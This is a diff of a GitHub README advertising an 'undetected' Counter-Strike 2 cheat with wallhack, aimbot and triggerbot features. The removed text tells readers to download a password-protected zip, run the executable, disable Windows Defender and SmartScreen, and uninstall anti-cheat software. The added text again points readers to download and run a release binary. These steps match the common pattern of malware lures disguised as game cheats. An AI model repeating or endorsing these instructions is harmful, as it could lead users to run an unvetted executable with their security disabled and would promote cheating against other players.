@@ -1,41 +1,74 @@
-# CS2 Midnight Cheat
-Updated
+# CS2 Best Undetected Cheat - Midnight 🌙
 
-![2](https://github.com/user-attachments/assets/6ad52314-9033-4009-9f14-25c23e1aba5d)
-![22](https://github.com/user-attachments/assets/8d119bdd-67ea-4c8a-a315-04985dc7dda0)
+![CS2 Best Undetected Cheat](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-brightgreen?style=for-the-badge&logo=github)
+
+Welcome to the **CS2 Best Undetected Cheat - Midnight** repository! This project offers a range of powerful tools designed to enhance your gameplay experience in Counter-Strike 2. Our cheat includes features like wallhack (WH), aimbot, radar, and other functionalities to give you the edge you need. 
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Future Plans](#future-plans)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Features ✨
+
+Our cheat comes with a variety of features that are optimized for performance:
+
+- **Wallhack (WH)**: See through walls to gain a tactical advantage.
+- **Aimbot**: Automatically aim at enemies for improved accuracy.
+- **Radar**: Get real-time updates on enemy positions.
+- **Performance Optimized**: The cheat does not reduce FPS or cause lags, ensuring smooth gameplay for everyone.
+
+## Installation ⚙️
+
+To get started, download the latest version from our [Releases section](https://github.com/Tarunsagar89/CS2-Best-Undetected-Cheat-Midnight/releases). 
+
+1. Navigate to the link above.
+2. Download the latest release file.
+3. Extract the downloaded file.
+4. Run the executable file to start using the cheat.
+
+## Usage 🎮
+
+Once you have installed the cheat, follow these steps to use it effectively:
+
+1. Launch Counter-Strike 2.
+2. Open the cheat application.
+3. Adjust settings according to your preferences.
+4. Start playing and enjoy the enhanced experience!
+
+## Future Plans 🚀
+
+We are committed to improving this cheat continuously. Here are some of our ideas for future updates:
+
+- **New Features**: We plan to introduce additional functionalities to enhance gameplay.
+- **Regular Updates**: Stay tuned for regular updates that will keep the cheat undetected and optimized.
+- **Community Feedback**: We value user feedback and will incorporate suggestions to improve the tool.
+
+## Contributing 🤝
+
+We welcome contributions from the community. If you have ideas or improvements, feel free to fork the repository and submit a pull request. 
+
+### How to Contribute
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Submit a pull request.
+
+## License 📄
+
+This project is licensed under the MIT License. Please see the [LICENSE](LICENSE) file for more details.
+
+## Contact 📬
+
+For any questions or suggestions, feel free to reach out. You can contact us through the GitHub issues page or directly at our support email.
 
 ---
-## How to Use
-1. **Get the Latest Version**: (https://github.com/Quasanthomeo/CS2-Best-Undetected-Cheat-Midnight/releases/download/latest/Midnight.zip).
-2. **Unzip the Files**: Use pass `Midnight` to unpack.
-3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
-4. **In-Game Key**: Press `HOME` to activate.
 
-## Technical Specifications:
-- **Supported Operating Systems**: Windows 10 / Windows 11
-- **Compatible Processors**: Intel and AMD
-- **Game Modes Supported**: Windowed Mode, Borderless Mode
-
----
-
-## System Requirements:
-- Disable **Windows Defender** and **Smart Screen**.
-- Remove anti-cheats **Faceit** and **Vanguard**.
-
----
-
-## FUNCTIONAL:
-
-- Chams and Esp box are convenient implementations of enemy display, you can choose one of two "wallhacks". 
-- Aimbot - there is no need to explain what it is for, but it would be useful to remind that this complex provides maximum opportunities in the game, use it wisely.
-- Backtrack is one of the "chips", part of Aimbot. A well-known feature that we "polished" to perfection.
-- Triggerbot - also like Aimbot, the complex gives a significant advantage, do not abuse it.
-- Visuals - a large block of settings. Among other things, it allows you to disable graphic effects (relevant for weak video cards).
-- Misc - other "hacks" for connoisseurs.
-
----
-
-## CONFIG SETTINGS:
-- **Create** / Save configurations
-- **Load** / Load existing configurations
-- **Delete** / Delete saved settings
+We hope you enjoy using **CS2 Best Undetected Cheat - Midnight**! For the latest updates and releases, make sure to check our [Releases section](https://github.com/Tarunsagar89/CS2-Best-Undetected-Cheat-Midnight/releases). Your gaming experience matters to us, and we are here to support you every step of the way!
